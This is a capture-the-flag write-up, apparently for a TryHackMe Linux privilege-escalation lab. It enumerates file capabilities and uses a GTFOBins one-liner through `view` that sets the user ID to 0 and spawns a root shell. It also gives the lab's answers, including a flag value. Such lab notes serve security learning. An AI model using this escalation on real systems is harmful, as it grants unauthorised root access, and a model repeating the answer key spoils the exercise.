## Privilege Escalation Capabilities Solution

### How many binaries have set capabilities?

1. Run the following command to list enabled capabilities

`getcap -r / 2>/dev/null`

![Screenshot 2024-02-08 at 1 16 42 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/1b2cf992-c502-421a-9021-2b13e46733dc)


**Answer: 6**

### What other binary can be used through its capabilities?
1. Go to GTFO to check which binaries can be exploited via capabilities [https://gtfobins.github.io/#+capabilities](https://gtfobins.github.io/#+capabilities)
2. From GTFO we can see that from the list of enabled capabilities (see above) `view` can be used.

**Answer: view**

### What is the content of the flag4.txt file? ###
1. Execute the following command based from GTFO. Don't forget to prepend `py3` as py is not supported for the machine. 
```
cp $(which view) .
./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

2. Exit vim

3. Run `cat /home/ubuntu/flag4.txt`

**Answer: THM-9349843**
